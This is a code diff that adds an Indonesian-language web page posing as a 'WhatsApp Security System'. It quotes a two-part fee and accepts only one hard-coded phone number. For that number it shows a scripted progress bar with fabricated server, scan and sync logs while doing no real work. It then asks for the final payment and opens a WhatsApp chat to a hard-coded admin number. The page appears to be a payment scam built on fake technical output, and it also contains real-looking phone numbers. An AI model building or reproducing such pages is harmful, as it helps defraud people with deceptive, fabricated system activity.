@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp Security System</title>
+
+<style>
+body {
+    background: #0d1117;
+    color: #25D366;
+    font-family: monospace;
+    padding: 20px;
+}
+
+.container {
+    max-width: 520px;
+    margin: auto;
+    border: 1px solid #25D366;
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 0 20px #25D36633;
+}
+
+.info {
+    background: #161b22;
+    padding: 10px;
+    border-radius: 6px;
+    margin-bottom: 15px;
+    font-size: 13px;
+}
+
+input, button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    background: #161b22;
+    color: #25D366;
+    border: 1px solid #25D366;
+    border-radius: 6px;
+}
+
+button:hover {
+    background: #25D366;
+    color: black;
+    cursor: pointer;
+}
+
+#output {
+    margin-top: 20px;
+    min-height: 160px;
+    white-space: pre-line;
+}
+
+.progress {
+    width: 100%;
+    background: #222;
+    margin-top: 15px;
+    border-radius: 6px;
+    overflow: hidden;
+}
+
+.progress-bar {
+    height: 12px;
+    width: 0%;
+    background: #25D366;
+}
+
+#percent {
+    text-align: right;
+    font-size: 12px;
+    margin-top: 5px;
+}
+
+#success, #failed {
+    display: none;
+    margin-top: 20px;
+    text-align: center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h2>📱 WhatsApp Security System</h2>
+
+    <div class="info">
+        💰 Informasi Biaya:<br>
+        - Biaya awal: Rp100.000<br>
+        - Biaya akhir: Rp100.000<br>
+        Total: Rp200.000
+    </div>
+
+    <input type="text" id="phone" placeholder="Masukkan nomor WhatsApp">
+
+    <button onclick="start()">Mulai Proses</button>
+
+    <div id="output"></div>
+
+    <div class="progress">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <div id="percent">0%</div>
+
+    <div id="success">
+        <h3>✅ Pengerjaan Selesai</h3>
+        <p>
+            Semua proses telah selesai.<br><br>
+            Untuk melanjutkan akses layanan, silakan lakukan pelunasan biaya akhir terlebih dahulu.<br>
+            Setelah pembayaran, hubungi admin untuk konfirmasi dan mendapatkan detail lanjutan.
+        </p>
+        <button onclick="contactAdmin()">📞 Hubungi Admin</button>
+    </div>
+
+    <div id="failed">
+        <h3 style="color:red;">❌ Gagal: Nomor tidak valid</h3>
+    </div>
+</div>
+
+<script>
+let progress = 0;
+const validNumber = "083168453133";
+
+let logs = [
+"[✓] Menghubungkan ke server...",
+"[✓] Validasi nomor...",
+"[✓] Scan sistem keamanan...",
+"[✓] Sinkronisasi perangkat...",
+"[✓] Finalisasi sistem..."
+];
+
+function start() {
+    let input = document.getElementById("phone").value.trim();
+
+    document.getElementById("output").innerHTML = "";
+    document.getElementById("success").style.display = "none";
+    document.getElementById("failed").style.display = "none";
+    document.getElementById("bar").style.width = "0%";
+    document.getElementById("percent").innerText = "0%";
+
+    progress = 0;
+    logs = [
+        "[✓] Menghubungkan ke server...",
+        "[✓] Validasi nomor...",
+        "[✓] Scan sistem keamanan...",
+        "[✓] Sinkronisasi perangkat...",
+        "[✓] Finalisasi sistem..."
+    ];
+
+    if (input !== validNumber) {
+        document.getElementById("output").innerHTML = "[!] Nomor tidak terdaftar dalam sistem.\nProses dihentikan.";
+        document.getElementById("failed").style.display = "block";
+        return;
+    }
+
+    runProgress();
+}
+
+function runProgress() {
+    if (progress <= 100) {
+        document.getElementById("bar").style.width = progress + "%";
+        document.getElementById("percent").innerText = progress + "%";
+
+        if (progress % 20 === 0 && logs.length > 0) {
+            document.getElementById("output").innerHTML += logs.shift() + "\n";
+        }
+
+        progress++;
+        setTimeout(runProgress, 600);
+    } else {
+        document.getElementById("output").innerHTML += "\n[✓] Sistem selesai.";
+        document.getElementById("success").style.display = "block";
+    }
+}
+
+function contactAdmin() {
+    let nomor = document.getElementById("phone").value.trim();
+    const message = encodeURIComponent(
+        "Halo admin, saya ingin konfirmasi hasil pengerjaan untuk nomor " + nomor + 
+        ". Saya siap melakukan pelunasan pembayaran akhir. Mohon info langkah selanjutnya."
+    );
+    window.open("https://wa.me/6285716070218?text=" + message, "_blank");
+}
+</script>
+
+</body>
+</html>
